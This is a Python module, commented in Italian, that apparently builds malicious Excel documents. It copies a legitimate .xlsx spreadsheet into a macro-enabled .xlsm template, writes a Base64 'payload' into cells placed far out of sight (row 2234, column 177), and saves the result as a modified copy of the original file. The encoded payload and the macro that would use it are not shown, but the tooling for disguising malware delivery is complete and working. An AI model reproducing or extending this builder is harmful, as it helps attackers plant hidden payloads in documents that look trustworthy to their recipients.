import time
import xlwings as xw
import os
from utils import CustomLogger


class ExcelHandler:
    def __init__(self, logger: CustomLogger, filename: str = None, template: str = None,
                 extension_xlsx: str = '.xlsx', extension_xlsm: str = '.xlsm'):
        """
        Inizializza la classe ExcelHandler.
        :param filename: Percorso del file Excel sorgente (senza macro).
        :param template: Percorso del file template in formato .xlsm che contiene macro.
        :param extension_xlsx: Estensione attesa per il file sorgente (default: .xlsx).
        :param extension_xlsm: Estensione per il file di output (default: .xlsm).
        """
        self.logging = logger
        self.filename = filename
        self.template = template
        self.extension_xlsx = extension_xlsx
        self.extension_xlsm = extension_xlsm
        self.wb_source = None
        self.wb_template = None

    def load_source(self) -> None:
        """
        Carica il file sorgente in formato .xlsx utilizzando xlwings.
        """
        if self.filename:
            if not self.filename.lower().endswith(self.extension_xlsx):
                self.logging.error(f"Il file {self.filename} non è un file {self.extension_xlsx}. Inserisci un file valido.")
                return
            try:
                self.wb_source = xw.Book(self.filename)
                self.logging.info(f"File sorgente {self.filename} caricato con successo.")
            except Exception as e:
                self.logging.error(f"Errore durante il caricamento del file sorgente: {e}")
        else:
            self.logging.error("Nessun file sorgente specificato.")

    def load_template(self) -> None:
        """
        Carica il file template in formato .xlsm.
        """
        if self.template:
            if not self.template.lower().endswith(self.extension_xlsm):
                self.logging.error(
                    f"Il file {self.template} non è un file {self.extension_xlsm}. Inserisci un file template valido.")
                return
            try:
                self.wb_template = xw.Book(self.template)
                self.logging.info(f"Template {self.template} caricato con successo.")
            except Exception as e:
                self.logging.error(f"Errore durante il caricamento del template: {e}")
        else:
            self.logging.error("Nessun file template specificato.")

    def copy_content(self) -> None:
        """
        Copia in maniera 1:1 il contenuto del file sorgente nel template.
        Utilizza le funzionalità native di copy-paste di Excel per preservare valori, formattazione,
        celle unite e altre proprietà.
        """
        if not self.wb_source or not self.wb_template:
            self.logging.error("Assicurarsi che il file sorgente e il template siano caricati.")
            return

        try:
            src_sheet = self.wb_source.sheets[0]
            tmpl_sheet = self.wb_template.sheets[0]
            # Determina l'intervallo usato nel foglio sorgente
            used_range = src_sheet.used_range
            # Copia l'intero intervallo e incolla nel template a partire da A1
            used_range.copy(destination=tmpl_sheet.range("A1"))
            time.sleep(10)
            self.logging.info("Contenuto copiato in maniera 1:1 dal file sorgente al template.")
        except Exception as e:
            self.logging.error(f"Errore durante la copia del contenuto: {e}")

    def write_payload_to_cells(self, payload_b64: str, start_row: int = 2234, finish_row: int = 2235,
                               start_column: int = 177) -> None:
        """
        Scrive il payload Base64 nelle celle specificate del template.
        Il payload viene scritto a partire dalla cella (start_row, start_column) e si estende fino a finish_row.

        :param payload_b64: Payload Base64 generato.
        :param start_row: Riga di partenza (default: 2234).
        :param finish_row: Riga di fine (default: 2235).
        :param start_column: Colonna di partenza (default: 177).
        """
        try:
            tmpl_sheet = self.wb_template.sheets[0]
            lines = payload_b64.split("\n")
            available_rows = finish_row - start_row + 1
            if len(lines) > available_rows:
                self.logging.warning(
                    f"Il payload ha {len(lines)} righe, ma sono disponibili solo {available_rows} righe. Verranno scritte solo le prime {available_rows} righe.")
                lines = lines[:available_rows]
            for i, part in enumerate(lines):
                tmpl_sheet.cells(start_row + i, start_column).value = part
                time.sleep(2)
            self.logging.info("Payload inserito con successo nelle celle del template.")
        except Exception as e:
            self.logging.error(f"Errore durante l'inserimento del payload: {e}")

    def save_workbook(self, save_as_new: bool = False) -> None:
        """
        Salva il workbook template modificato in formato .xlsm, preservando le macro.

        :param save_as_new: Se True, chiede un nuovo nome di file.
        """

        try:
            if save_as_new:
                new_filename = input("Inserisci il nome del nuovo file (con estensione .xlsm): ")
                if not new_filename.lower().endswith(self.extension_xlsm):
                    self.logging.error(f"Il nuovo file deve avere estensione {self.extension_xlsm}.")
                    return
                output_filename = new_filename
            else:
                base, _ = os.path.splitext(self.filename)
                output_filename = base + "_mod" + self.extension_xlsm
            self.wb_template.save(output_filename)
            self.logging.info(f"File salvato come {output_filename}.")
        except Exception as e:
            self.logging.error(f"Errore durante il salvataggio del file: {e}")